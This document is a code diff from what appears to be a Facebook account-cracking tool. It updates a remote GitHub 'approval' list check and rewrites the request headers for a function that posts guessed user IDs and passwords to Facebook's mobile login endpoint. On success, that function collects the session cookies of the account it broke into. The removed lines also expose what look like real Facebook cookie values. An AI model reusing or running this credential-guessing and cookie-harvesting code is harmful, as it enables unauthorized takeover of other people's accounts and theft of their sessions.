@@ -155,7 +155,7 @@ def meyexudi():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "-".join(uuid)
   try:
-    httpCaht = requests.get('https://github.com/khanbrother420/Khan-special/blob/main/Approval.txt').text
+    httpCaht = requests.get('https://github.com/mrrakibkhan420/khan-official/blob/main/Approved.txt').text
     if id in httpCaht:
       print(fuckyoursali)
       print(hedaborakarent)
@@ -353,28 +353,27 @@ def KHAN(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             #_____Mathoid______#
-            header_freefb = {'authority': 'p.facebook.com',
-           'method': 'POST',
-           'schem': 'https',
-           'accept': '*/*',
-           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-           'content-type': 'application/x-www-form-urlencoded',
-           # 'cookie': 'datr=ULBQZOq4O4vkj1LFZs-XzTn1; sb=ULBQZMfuCJJx0lCgGuUlV4zg; m_pixel_ratio=1.75; sfiu=AYhuILXKOO7Ht-c87qiCCnh6cLZlUXPKkH-ld4Dv3r9NadPc7ApwR3naYd4PGAkexnDHlr8_ZRgp_HFJcQYa6_NjrwglFDHC2nvfmtSuR_vDqNSaZR5hYE7n2J1ZBOBKRyl5iz2xSC0bzI6IBG7g2dExmWo5U1uncR2lyDoLoF8L2iBmhhocvfhzxz8dovL1ytWzZXwsOaHhS1SscApNRU9qoOH5YwdD_8Wb671fosCDEw; wd=412x785; x-referer=eyJyIjoiLyIsImgiOiIvIiwicyI6InAifQ%3D%3D; fr=0pDrj7bNh6Yx8ears..BkULBQ.mP.AAA.0.0.BkULHh.AWUiPDdsjd8',
-           'origin': 'https://p.facebook.com',
-           'referer': 'https://p.facebook.com/',
-           'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="112", "Google Chrome";v="112"',
-           'sec-ch-ua-mobile': '?0',
-           'sec-ch-ua-platform': '"Windows"',
-           'sec-fetch-dest': 'empty',
-           'sec-fetch-mode': 'cors',
-           'sec-fetch-site': 'same-origin',
-           'user-agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5629.220 Safari/537.36',
-           'x-asbd-id': '198387',
-           'x-fb-lsd': 'AVrnx9O0Ff0',
-           'x-requested-with': 'XMLHttpRequest',
-           'x-response-format': 'JSONStream',
-}
-            lo = session.post('https://p. facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=1 00',data=log_data,headers=header_freefb).text
+            header_freefb = {"authority": 'p.facebook.com',
+            "method": 'POST',
+            "scheme": 'https',
+            "accept": 'application/x-www-form-urlencoded',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=0.9',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://p.facebook.com/',
+            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'empty',
+            "sec-fetch-mode": 'cors',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
